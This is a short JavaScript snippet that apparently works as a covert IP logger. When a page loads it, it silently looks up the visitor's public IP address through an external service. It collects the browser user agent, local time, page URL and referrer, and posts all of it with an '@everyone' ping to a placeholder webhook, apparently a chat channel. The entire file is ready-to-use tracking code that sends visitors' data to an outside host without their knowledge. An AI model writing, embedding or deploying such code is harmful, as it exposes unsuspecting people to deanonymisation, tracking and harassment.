var webhook = 'WEBHOOK-URL';
var site = 'https://myexternalip.com/raw';

var get_ip = function() {
    var ip = '';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', site, false);
    xhr.send();
    if (xhr.status == 200) {
        ip = xhr.responseText;
    }
    return ip;
};

function get_browser() {
    var browser = navigator.userAgent;
    return browser;
    }

function get_time() {
    var date = new Date();
    var time = date.toLocaleString();
    return time;
    }

function get_url() {
    var url = window.location.href;
    return url;
    }

function get_referrer() {
    var referrer = document.referrer;
    return referrer;
    }

function send_webhook() {
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `@everyone \nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\n`
        })
    });
}

send_webhook();
